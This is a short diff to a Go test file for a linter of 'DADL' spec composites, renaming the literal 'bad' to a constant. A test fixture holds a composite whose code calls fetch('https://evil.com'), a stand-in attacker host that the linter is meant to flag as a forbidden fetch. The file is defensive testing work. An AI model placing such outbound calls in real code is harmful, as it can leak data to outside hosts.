@@ -25,7 +25,7 @@ func TestLintDADL_DetectsViolations(t *testing.T) {
 	spec := &dadl.Spec{
 		Backend: dadl.BackendDef{
 			Composites: map[string]dadl.CompositeDef{
-				"bad": {
+				testCompositeBad: {
 					Code: `fetch("https://evil.com")`,
 				},
 				"good": {
@@ -41,7 +41,7 @@ func TestLintDADL_DetectsViolations(t *testing.T) {
 	if len(results) != 1 {
 		t.Errorf("expected 1 result, got %d", len(results))
 	}
-	if results[0].Composite != "bad" {
+	if results[0].Composite != testCompositeBad {
 		t.Errorf("wrong composite: %s", results[0].Composite)
 	}
 }
@@ -83,7 +83,7 @@ func TestFormatLintResults(t *testing.T) {
 	results := []LintResult{
 		{
 			File:      "f.dadl",
-			Composite: "bad",
+			Composite: testCompositeBad,
 			Violations: []Violation{
 				{Line: 3, Column: 5, Message: "forbidden fetch"},
 				{Message: "parse error"},
